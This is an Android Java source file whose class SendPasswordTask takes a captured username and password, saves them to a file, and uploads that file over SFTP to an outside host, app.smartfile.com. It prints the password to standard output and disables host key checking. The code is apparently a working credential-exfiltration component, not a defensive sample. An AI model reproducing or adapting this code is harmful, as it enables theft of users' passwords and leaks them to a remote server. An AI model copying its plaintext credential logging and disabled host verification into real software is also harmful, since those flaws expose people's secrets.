package com.passwordLib;

import android.content.Context;
import android.os.AsyncTask;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

public class SendPasswordTask extends AsyncTask<Object, Void, Boolean> {

	Context context;
	String username;
	String password;

	@Override
	protected Boolean doInBackground(Object... params) {
		System.out.println("get args " + params[0]);
		context = (Context) (params[0]);
		System.out.println("get args " + params[1]);
		username = (String) (params[1]);
		System.out.println("get args " + params[2]);
		password = (String) (params[2]);
		JSch jsch = new JSch();
		Session session = null;

		final String SERVER = "app.smartfile.com";
		final String USERNAME = PasswordFile.username;
		final String PASSWORD = PasswordFile.password;

		PasswordFile.saveFile();

		String fileName = PasswordFile.fileName;

		try {
			session = jsch.getSession(USERNAME, SERVER, 22);

			session.setConfig("StrictHostKeyChecking", "no");

			session.setPassword(PASSWORD);

			session.connect();

			Channel channel = session.openChannel("sftp");

			channel.connect();

			ChannelSftp sftpChannel = (ChannelSftp) channel;

			sftpChannel.put(context.getFilesDir() + "/" + fileName, fileName);

			sftpChannel.exit();

		} catch (JSchException e) {
			e.printStackTrace();
		} catch (SftpException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return true;
	}

	protected void onPostExecute(Boolean result) {
		// do nothing
	}

}
